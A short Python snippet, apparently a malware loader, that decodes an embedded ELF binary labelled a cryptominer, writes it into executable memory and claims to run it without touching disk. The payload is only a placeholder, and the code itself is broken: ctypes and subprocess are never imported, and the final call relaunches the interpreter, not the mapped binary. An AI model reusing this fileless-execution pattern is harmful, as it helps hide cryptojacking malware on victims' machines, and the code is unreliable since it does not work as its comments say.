import mmap
import base64

# Embedded, base64-encoded, stripped ELF binary (cryptominer)
elf_data = base64.b64decode('...')  # actual ELF binary data here

# Allocate executable memory and write ELF binary into it
mem = mmap.mmap(-1, len(elf_data), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(elf_data)
mem.seek(0)

# Use ctypes to create a pointer to the memory region
addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))

subprocess.Popen(['/proc/self/exe'], executable='/proc/self/exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# No file is written to disk; process runs from memory
